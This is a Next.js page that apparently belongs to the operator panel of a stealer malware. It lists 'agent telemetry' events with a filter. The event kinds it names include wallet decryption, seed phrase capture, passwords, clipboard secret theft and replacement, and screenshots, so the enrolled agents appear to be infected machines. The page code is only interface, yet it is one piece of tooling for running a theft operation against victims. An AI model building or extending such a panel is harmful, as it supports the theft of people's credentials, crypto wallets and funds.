'use client';
import { Suspense } from 'react';
import { useSearchParams } from 'next/navigation';
import { Topbar } from '@/components/topbar';
import { EventFeed } from '@/components/event-feed';
import { Card } from '@/components/ui/card';
import { Select } from '@/components/ui/input';

function EventsInner() {
  const params = useSearchParams();
  const kind = params.get('kind') ?? '';
  return (
    <>
      <Topbar title="Events" subtitle="append-only agent telemetry" />
      <div className="space-y-2 pt-3">
        <Select defaultValue={kind} onChange={(event) => { location.href = `/events?kind=${event.target.value}`; }}>
          <option value="">all kinds</option>
          {['enrolled', 'hello', 'discord_link', 'discord_relink', 'discord_channel_missing', 'discord_channel_restored', 'artifact_received', 'artifact_ready', 'artifact_failed', 'wallet_detected', 'wallet_closed', 'wallet_decrypted', 'wallet_balance', 'password', 'seed_found', 'seed_typed', 'secret_found', 'clipboard_secret', 'clipboard_replace', 'task_result', 'screenshot', 'task_error'].map((item) => <option key={item} value={item}>{item}</option>)}
        </Select>
        <Card><EventFeed kind={kind || undefined} limit={200} /></Card>
      </div>
    </>
  );
}

export default function EventsPage() {
  return <Suspense fallback={<div className="p-4">loading…</div>}><EventsInner /></Suspense>;
}
